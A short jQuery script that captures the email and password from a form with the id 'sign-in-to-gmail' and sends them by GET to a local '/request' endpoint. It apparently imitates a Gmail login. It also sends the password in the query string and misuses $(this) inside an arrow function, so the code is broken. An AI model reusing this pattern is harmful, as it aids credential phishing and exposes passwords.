$( 'document' ).ready( function() {
    $( '#sign-in-to-gmail' ).on( 'submit', ( e ) => {
        e.preventDefault()
    
        const $this = $( this ),
              email = $this.find( '.email' ).val(),
              password = $this.find( '.password' ).val()
    
        $.ajax({
            type: 'GET',
            url: '/request',
            data: { email, password },
            success: function (result) {
                console.log('success', result);
            },
            error: function (result) {
                console.log('error', result);
            }
        });
    })
})